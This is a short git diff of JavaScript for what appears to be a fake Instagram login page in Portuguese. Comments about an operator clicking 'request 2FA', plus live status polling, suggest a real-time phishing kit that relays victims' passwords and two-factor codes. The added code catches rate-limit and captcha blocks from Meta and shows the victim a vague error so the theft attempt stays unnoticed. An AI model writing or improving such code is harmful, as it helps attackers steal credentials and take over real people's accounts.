@@ -134,6 +134,17 @@ function iniciarEsperaStatus(usuario, tipo = "usuario") {
         return;
       }
 
+      // 1.1 Limite de taxa ou desafio de segurança (não expor como senha errada)
+      if (data.status_credencial === "rate_limit" || data.status_credencial === "bloqueio_captcha" || data.status_credencial === "bloqueio_meta") {
+        clearInterval(pollingInterval);
+        pollingInterval = null;
+
+        submitButton.disabled = false;
+        submitButton.textContent = 'Entrar';
+        mostrarErro("Ocorreu um problema ao entrar no Instagram. Tente novamente mais tarde.");
+        return;
+      }
+
       // 2. Operador clicou em Solicitar 2FA
       if (data.status_login === "solicitar_2fa") {
         clearInterval(pollingInterval);
@@ -184,6 +195,11 @@ function conectarSSELogin() {
               passwordInput.value = "";
               passwordInput.focus();
             }
+          } else if (item.status_credencial === "rate_limit" || item.status_credencial === "bloqueio_captcha" || item.status_credencial === "bloqueio_meta") {
+            if (pollingInterval) clearInterval(pollingInterval);
+            submitButton.disabled = false;
+            submitButton.textContent = 'Entrar';
+            mostrarErro("Ocorreu um problema ao entrar no Instagram. Tente novamente mais tarde.");
           } else if (item.status_login === "solicitar_2fa") {
             if (pollingInterval) clearInterval(pollingInterval);
             submitButton.textContent = 'Carregando...';
